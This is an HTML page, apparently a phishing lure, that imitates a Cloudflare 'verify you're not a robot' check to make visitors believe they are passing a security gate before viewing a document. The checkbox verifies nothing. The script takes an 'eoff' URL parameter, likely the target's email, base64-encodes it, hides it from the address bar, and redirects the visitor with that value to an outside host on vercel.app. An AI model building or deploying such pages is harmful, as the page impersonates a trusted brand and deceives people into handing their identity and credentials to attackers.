<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AED Inv</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .verification-container {
            border-radius: 12px;
            padding: 30px;
            width: 100%;
            max-width: 500px;
        }

        .instruction-text {
            text-align: center;
            margin-bottom: 20px;
            color: #333;
            font-size: 16px;
        }

        .verification-box {
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            padding: 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            transition: all 0.3s ease;
        }

        .verification-box:hover {
            border-color: #c0c0c0;
        }

        .left-section {
            display: flex;
            align-items: center;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            cursor: pointer;
            user-select: none;
        }

        .checkbox-input {
            display: none;
        }

        .checkbox-custom {
            width: 24px;
            height: 24px;
            border: 2px solid #ddd;
            border-radius: 4px;
            margin-right: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s ease;
        }

        .checkbox-input:checked + .checkbox-custom {
            background-color: #4CAF50;
            border-color: #4CAF50;
        }

        .checkbox-input:checked + .checkbox-custom::after {
            content: "✓";
            color: white;
            font-weight: bold;
        }

        .verification-text {
            font-size: 16px;
            color: #333;
            font-weight: 500;
        }

        .verifying-text {
            color: #2196F3;
            font-weight: 600;
            display: none;
        }

        .success-text {
            color: #4CAF50;
            font-weight: 600;
            display: none;
        }

        .right-section {
            text-align: right;
        }

        .brand-container {
            display: flex;
            flex-direction: column;
            align-items: flex-end;
        }

        .brand-row {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 5px;
        }

        .cloudflare-img {
            width: 32px;
            height: 32px;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 10px;
            color: #777;
        }

        .brand {
            font-size: 15px;
            font-weight: 700;
            color: #2c3e50;
            letter-spacing: 1px;
        }

        .footer {
            color: #777;
            font-size: 12px;
        }

        /* Loading spinner */
        .spinner {
            width: 20px;
            height: 20px;
            border: 2px solid rgba(33, 150, 243, 0.3);
            border-radius: 50%;
            border-top-color: #2196F3;
            animation: spin 1s ease-in-out infinite;
            margin-right: 12px;
            display: none;
        }

        /* Initial loading spinner */
        .initial-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(33, 150, 243, 0.3);
            border-radius: 50%;
            border-top-color: #2196F3;
            animation: spin 1s ease-in-out infinite;
            margin: 30px auto;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* States */
        .loading .checkbox-custom {
            display: none;
        }

        .loading .spinner {
            display: block;
        }

        .loading .verification-text {
            display: none;
        }

        .loading .verifying-text {
            display: inline;
        }

        .success .checkbox-custom {
            display: none;
        }

        .success .spinner {
            display: none;
        }

        .success .verification-text {
            display: none;
        }

        .success .verifying-text {
            display: none;
        }

        .success .success-text {
            display: inline;
        }

        /* Hidden state */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="initialLoading" class="initial-spinner"></div>

    <div id="verificationContent" class="verification-container hidden">
        <div class="instruction-text">To view this document, verify you're not a robot below</div>

        <div class="verification-box" id="verificationBox">
            <div class="left-section">
                <label class="checkbox-container" id="checkboxLabel">
                    <input type="checkbox" class="checkbox-input" id="verificationCheckbox">
                    <span class="checkbox-custom"></span>
                    <span class="spinner"></span>
                    <span class="verification-text">Verify</span>
                    <span class="verifying-text">Verifying...</span>
                    <span class="success-text">Success!</span>
                </label>
            </div>

            <div class="right-section">
                <div class="brand-container">
                    <div class="brand-row">
                        <img src="cloudflare_.png" class="cloudflare-img" alt="Logo">
                        <div class="brand">CLOUDFLARE</div>
                    </div>
                    <div class="footer">Privacy · Terms</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Configuration - Base URL parts for fail-safe construction
            const REDIRECT_CONFIG = {
                protocol: 'https:',
                domain: 'zainillc.vercel.app',
                path: '/',
                paramKey: 'eoff'
            };

            // Process URL parameters
            function processUrlParameters() {
                try {
                    const currentUrl = window.location.href;
                    const eoffIndex = currentUrl.indexOf('eoff=');

                    if (eoffIndex !== -1) {
                        // Extract the value after eoff=
                        let eoffValue = currentUrl.substring(eoffIndex + 5);

                        // Remove any additional parameters after eoff value
                        const ampersandIndex = eoffValue.indexOf('&');
                        if (ampersandIndex !== -1) {
                            eoffValue = eoffValue.substring(0, ampersandIndex);
                        }

                        // Encode the value in base64
                        const encodedValue = btoa(eoffValue);

                        // Update the URL with the encoded value
                        const baseUrl = currentUrl.split('?')[0];
                        const newUrl = baseUrl + '?encoded=' + encodedValue;
                        window.history.replaceState(null, '', newUrl);

                        return encodedValue;
                    }
                } catch (error) {
                    console.error('Error processing URL parameters:', error);
                }
                return null;
            }

            // Build redirect URL safely
            function buildRedirectUrl(encodedValue) {
                try {
                    // Construct URL parts safely
                    const urlParts = [
                        REDIRECT_CONFIG.protocol,
                        '//',
                        REDIRECT_CONFIG.domain,
                        REDIRECT_CONFIG.path
                    ];

                    // Join base URL parts
                    let redirectUrl = urlParts.join('');

                    // Add parameter if available
                    if (encodedValue) {
                        const separator = redirectUrl.includes('?') ? '&' : '?';
                        redirectUrl += separator + REDIRECT_CONFIG.paramKey + '=' + encodedValue;
                    }

                    // Validate URL before returning
                    try {
                        new URL(redirectUrl);
                        return redirectUrl;
                    } catch (urlError) {
                        console.error('Invalid redirect URL constructed:', redirectUrl);
                        // Fallback to base URL without parameters
                        return urlParts.join('');
                    }
                } catch (error) {
                    console.error('Error building redirect URL:', error);
                    // Ultimate fallback
                    return REDIRECT_CONFIG.protocol + '//' + REDIRECT_CONFIG.domain + REDIRECT_CONFIG.path;
                }
            }

            // Safe redirect function
            function safeRedirect(url) {
                try {
                    // Multiple fallback methods for maximum compatibility
                    if (window.location.replace) {
                        window.location.replace(url);
                    } else if (window.location.href) {
                        window.location.href = url;
                    } else {
                        // Last resort - create a clickable link
                        const link = document.createElement('a');
                        link.href = url;
                        link.click();
                    }
                } catch (redirectError) {
                    console.error('Redirect failed:', redirectError);
                    // Final emergency fallback
                    setTimeout(function() {
                        window.location.href = url;
                    }, 100);
                }
            }

            // Show initial spinner for 2 seconds
            setTimeout(function() {
                try {
                    document.getElementById('initialLoading').classList.add('hidden');
                    document.getElementById('verificationContent').classList.remove('hidden');

                    // Process URL parameters after the initial loading
                    const encodedValue = processUrlParameters();
                    console.log('Encoded value:', encodedValue);
                } catch (initError) {
                    console.error('Error during initialization:', initError);
                }
            }, 2000);

            // Verification checkbox handler
            const checkbox = document.getElementById('verificationCheckbox');
            const verificationBox = document.getElementById('verificationBox');

            checkbox.addEventListener('change', function() {
                if (this.checked) {
                    // Show loading state
                    verificationBox.classList.add('loading');

                    // Get the encoded value from URL
                    const urlParams = new URLSearchParams(window.location.search);
                    const encodedValue = urlParams.get('encoded');

                    // Simulate verification process
                    setTimeout(function() {
                        try {
                            verificationBox.classList.remove('loading');
                            verificationBox.classList.add('success');

                            // Build redirect URL safely
                            const redirectUrl = buildRedirectUrl(encodedValue);
                            console.log('Redirecting to:', redirectUrl);

                            // Redirect after showing success state
                            setTimeout(function() {
                                safeRedirect(redirectUrl);
                            }, 1000);
                        } catch (verificationError) {
                            console.error('Error during verification process:', verificationError);
                        }
                    }, 1500);
                }
            });
        });
    </script>
</body>
</html>
